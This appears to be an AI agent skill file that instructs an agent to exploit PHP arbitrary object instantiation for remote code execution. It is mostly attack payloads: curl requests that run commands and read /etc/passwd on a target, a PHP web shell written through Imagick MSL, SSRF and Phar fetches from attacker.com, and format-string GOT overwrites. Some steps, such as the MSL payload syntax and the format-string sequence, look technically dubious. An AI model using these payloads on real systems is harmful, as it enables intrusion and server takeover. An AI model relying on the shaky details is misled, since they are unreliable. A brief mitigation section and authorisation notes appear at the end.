---
name: php-arbitrary-object-rce
description: PHP pentesting skill for exploiting arbitrary object instantiation vulnerabilities (new $_GET["a"]($_GET["b"])) to achieve Remote Code Execution. Use this skill whenever you encounter PHP code with dynamic class instantiation, user-controlled class names, or need to enumerate PHP classes for RCE. Trigger this skill for any PHP security assessment involving object creation, constructor exploitation, or when analyzing vulnerable patterns like `new $user_input()` or `new $_GET['class']()`.
---

# PHP Arbitrary Object Instantiation RCE Exploitation

This skill helps you identify and exploit PHP vulnerabilities where user input controls class instantiation, leading to Remote Code Execution (RCE).

## Vulnerable Patterns to Detect

Look for these dangerous patterns in PHP code:

```php
// Direct user-controlled class instantiation
new $_GET['a']($_GET['b']);
new $user_input();
new $class_name($arg);

// Via variables
$a = $_GET['class'];
new $a($b);

// In frameworks or libraries
$reflection = new ReflectionClass($user_input);
$obj = new $model();
```

## Attack Vectors

### 1. Custom Classes with Dangerous Constructors

**When to use:** Target application has custom classes with constructors that execute code.

**Exploitation:**

```php
// Target class in application
class App {
    function __construct($cmd) {
        system($cmd);  // DANGEROUS
    }
}

// Exploit payload
GET /vulnerable.php?a=App&b=uname%20-a
```

**Legacy constructor names (PHP < 5.3):**
```php
class App2 {
    function App2($cmd) {  // Legacy constructor
        system($cmd);
    }
}
```

### 2. Autoloader Exploitation

**When to use:** No custom classes exist, but autoloading is configured.

**Detection:** Look for `spl_autoload_register()` or `__autoload()` in code.

**Common autoloader patterns:**
```php
// PSR-4 style
spl_autoload_register(function($class_name) {
    include './classes/' . $class_name . '.php';
});

// Simple autoload
function __autoload($class_name) {
    include $class_name . '.php';
}
```

**Exploitation:**
- Create a malicious class file in the autoload path
- Trigger instantiation to load your class
- Your constructor executes arbitrary code

### 3. Built-in PHP Classes

**When to use:** No custom classes or autoloaders available.

**Enumeration:**
```php
// List all available classes
echo implode(', ', get_declared_classes());

// Check class constructors via reflection
$classes = get_declared_classes();
foreach ($classes as $class) {
    $ref = new ReflectionClass($class);
    if ($ref->hasMethod('__construct')) {
        echo $class . " has constructor\n";
    }
}
```

**Useful built-in classes:**

| Class | Attack Vector | Payload Example |
|-------|--------------|-----------------|
| `SplFileObject` | SSRF | `new SplFileObject('http://attacker.com/')` |
| `PDO` | File operations | `new PDO('sqlite:/tmp/test.txt')` |
| `SoapClient` | XXE (PHP ≤5.3.22) | `new SoapClient('http://attacker.com/evil.wsdl')` |
| `SimpleXMLElement` | XXE (PHP ≤5.4.12) | `new SimpleXMLElement('<xml>...</xml>')` |

**SSRF + Phar Deserialization (PHP < 8.0):**
```php
// Trigger SSRF to attacker's server
new SplFileObject('http://attacker.com/evil.phar');

// Attacker serves malicious Phar archive
// PHP deserializes it, triggering __wakeup()
```

### 4. Imagick Extension Exploitation

**When to use:** ImageMagick/Imagick extension is installed.

**Detection:**
```php
if (class_exists('Imagick')) {
    echo "Imagick is available";
}
```

**VID Parser File Write:**
```php
// Write to arbitrary path using MSL protocol
new Imagick('msl:/tmp/shell.php');

// MSL payload to write PHP shell
$msl = <<<'MSL'
push graphic-context
set fill "<?php system($_GET['c']); ?>"
draw text 0,0 "<?php system($_GET['c']); ?>"
pop graphic-context
MSL;
```

**File Upload + VID Parser:**
```php
// PHP stores uploads in /tmp/phpXXXXXX
// Use wildcards to copy to web-accessible location
new Imagick('msl:/tmp/php*');
```

### 5. Format-String Bug (PHP 7.0.0 Only)

**When to use:** Target runs PHP 7.0.0 specifically (Bug #71105).

**Detection:**
```bash
# Check PHP version
curl -I http://target/ | grep -i x-powered-by

# Test for format-string vulnerability
curl "http://target/vuln.php?model=%p-%p-%p"
# If you see memory addresses in error output, it's vulnerable
```

**Exploitation Steps:**

1. **Leak addresses:**
```bash
curl "http://target/vuln.php?model=%p-%p-%p-%p-%p"
# Fatal error shows leaked pointers
```

2. **Calculate write position:**
```bash
# Use width specifiers to control byte count
curl "http://target/vuln.php?model=%.1000d%1$n"
```

3. **Overwrite GOT entry:**
```bash
# Partial overwrite of free() to system()
curl "http://target/vuln.php?model=%p%10000d%1$n"
```

4. **Trigger shell:**
```bash
curl "http://target/vuln.php?model=|id"
# Hijacked function executes: system("|id")
```

## Practical Exploitation Workflow

### Step 1: Reconnaissance

```bash
# Check PHP version
curl -I http://target/

# Enumerate classes (if you can execute PHP)
php -r "print_r(get_declared_classes());"

# Check for Imagick
php -r "echo class_exists('Imagick') ? 'Imagick available' : 'No Imagick';"
```

### Step 2: Identify Vulnerable Code

Search for patterns:
- `new $_GET`
- `new $_POST`
- `new $` followed by user input
- `ReflectionClass` with user input
- `new $class` where `$class` is user-controlled

### Step 3: Select Attack Vector

| Scenario | Best Attack |
|----------|-------------|
| Custom classes exist | Direct constructor exploitation |
| Autoloader configured | Malicious class file creation |
| Only built-ins available | SSRF, PDO, or XXE |
| Imagick installed | File write via MSL |
| PHP 7.0.0 | Format-string GOT overwrite |

### Step 4: Craft Payload

**Basic RCE:**
```bash
# If App class exists with system() in constructor
curl "http://target/vuln.php?a=App&b=id"

# URL-encoded
curl "http://target/vuln.php?a=App&b=cat%20/etc/passwd"
```

**Complex payload with Imagick:**
```bash
# Create MSL payload file
cat > shell.msl << 'EOF'
push graphic-context
set fill "<?php system(\$_GET['cmd']); ?>"
draw text 0,0 "<?php system(\$_GET['cmd']); ?>"
pop graphic-context
EOF

curl "http://target/vuln.php?a=Imagick&b=msl:/path/to/shell.msl"
```

## Mitigation Detection

**Check if patched:**
```php
// Safe pattern - whitelist approach
$allowed_classes = ['App', 'Model', 'Controller'];
if (in_array($class, $allowed_classes)) {
    new $class();
}

// Safe pattern - no user input in class name
new FixedClassName($user_input);  // Class name is constant
```

## Common Framework Vulnerabilities

**Laravel:**
```php
// Vulnerable if model name is user-controlled
$model = new $request->input('model');
```

**Symfony:**
```php
// Check for dynamic class instantiation in services
$service = new $class_name();
```

## Testing Checklist

- [ ] Identify all `new $variable` patterns
- [ ] Check if variable is user-controlled
- [ ] Enumerate available classes
- [ ] Test custom class constructors
- [ ] Check for autoloader configuration
- [ ] Test built-in classes (SplFileObject, PDO, etc.)
- [ ] Check for Imagick extension
- [ ] Verify PHP version (7.0.0 format-string bug)
- [ ] Attempt SSRF via SplFileObject
- [ ] Attempt file write via Imagick MSL

## References

- [Exploiting Arbitrary Object Instantiations](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)
- [PHP Bug #71105 - Format String in Class Resolution](https://bugs.php.net/bug.php?id=71105)
- [The Art of PHP: CTF-born exploits](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [3v4l.org - PHP Sandbox](https://3v4l.org/)

## Safety Notes

- Only use these techniques on systems you own or have explicit authorization to test
- RCE vulnerabilities are critical severity (CVSS 9.8+)
- Document findings responsibly and report to affected parties
- Imagick attacks may crash the target server
- Format-string exploitation is version-specific and fragile
